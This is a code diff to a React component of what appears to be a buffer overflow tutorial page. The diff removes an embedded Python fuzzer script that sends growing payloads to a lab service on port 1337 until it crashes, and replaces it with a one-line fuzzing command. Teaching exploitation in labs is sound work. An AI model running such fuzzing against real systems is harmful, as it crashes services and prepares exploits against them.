@@ -34,37 +34,17 @@ const BufferOverflowStep1 = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
-            <Typography variant="h6">1-Fuzzer.py</Typography>
+            <Typography variant="h6">Fuzzing</Typography>
             <Typography>
-              This program will give us a general idea of where the program
+              This command will give us a general idea of where the program
               crashes at.
             </Typography>
             <SyntaxHighlighter className="syntax" language="python">
-              {"#!/usr/bin/env python3\n\n" +
-                "import socket, time, sys\n\n" +
-                'ip = "10.10.189.218"\n\n' +
-                "port = 1337\n" +
-                "timeout = 5\n" +
-                'prefix = "OVERFLOW1 "\n\n' +
-                'string = prefix + "A" * 100\n\n' +
-                "while True:\n" +
-                "  try:\n" +
-                "    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n" +
-                "      s.settimeout(timeout)\n" +
-                "      s.connect((ip, port))\n" +
-                "      s.recv(1024)\n" +
-                '      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))\n' +
-                '      s.send(bytes(string, "latin-1"))\n' +
-                "      s.recv(1024)\n" +
-                "except:\n" +
-                '  print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))\n' +
-                "  sys.exit(0)\n" +
-                'string += 100 * "A"\n' +
-                "time.sleep(1)"}
+              {"python buff.py --fuzz -d 10.10.253.128 -p 1337"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Example Output</Typography>
-            <Image src="/Step1.png" height={185} width={436} />
+            <Image src="/Step1.png" height={214} width={608} />
           </Typography>
         </AccordionDetails>
       </Accordion>
